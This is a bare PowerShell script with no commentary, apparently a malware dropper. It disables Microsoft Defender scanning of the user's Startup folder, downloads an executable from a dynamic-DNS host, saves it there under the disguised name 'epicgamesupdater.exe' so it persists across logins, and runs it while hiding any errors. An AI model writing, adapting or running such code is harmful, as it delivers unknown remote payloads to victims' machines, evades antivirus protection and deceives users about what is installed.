$url = "http://fcsab.ddns.net:3010/love.exe"
$startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
$exePath = "$startupPath\epicgamesupdater.exe"

try { Add-MpPreference -ExclusionPath $startupPath -EA 0 } catch {}
try {
    Invoke-WebRequest -Uri $url -OutFile $exePath -UseBasicParsing -EA Stop
    Start-Process -FilePath $exePath
} catch {}

exit



